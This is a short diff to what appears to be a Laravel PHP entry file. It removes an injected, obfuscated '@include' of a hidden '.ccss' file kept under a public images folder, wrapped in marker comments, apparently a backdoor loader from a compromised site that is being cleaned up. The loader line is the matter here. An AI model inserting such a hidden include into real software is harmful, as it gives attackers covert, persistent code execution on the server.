@@ -1,9 +1,5 @@
 <?php
-/*58e39*/
 
-@include /*j7r*/("/var/www/dg/pub\x6cic/images/digita\x6c\x2dstudio/b\x6cog/.282646d4.ccss");
-
-/*58e39*/
 
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
